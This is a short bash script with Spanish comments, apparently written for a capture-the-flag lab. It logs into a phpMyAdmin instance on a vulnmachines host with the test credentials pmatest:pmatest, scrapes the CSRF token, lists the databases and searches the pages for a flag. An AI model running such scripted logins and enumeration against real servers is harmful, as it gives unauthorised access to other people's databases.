#!/bin/bash

echo "[*] Accediendo a PHPMyAdmin con credenciales pmatest:pmatest..."

# Obtener token y cookies
RESPONSE=$(curl -s -c cookies.txt http://hackme7.vulnmachines.com:8099/pma/index.php)
TOKEN=$(echo "$RESPONSE" | grep -oP 'name="token" value="\K[^"]+' | head -1)

echo "[+] Token obtenido: $TOKEN"

# Login
curl -s -c cookies.txt -b cookies.txt -X POST http://hackme7.vulnmachines.com:8099/pma/index.php \
    -d "pma_username=pmatest&pma_password=pmatest&server=1&token=$TOKEN" \
    -o /dev/null

echo "[*] Explorando bases de datos..."

# Listar bases de datos
curl -s -b cookies.txt "http://hackme7.vulnmachines.com:8099/pma/server_databases.php?token=$TOKEN" | \
    grep -E "(database|schema|table)" -i | grep -v "information_schema" | head -20

# Intentar acceder a la página principal después del login
echo -e "\n[*] Verificando acceso..."
curl -s -b cookies.txt "http://hackme7.vulnmachines.com:8099/pma/index.php?token=$TOKEN" | \
    grep -E "(Welcome|database|table|vmn|flag)" -i | head -10

rm -f cookies.txt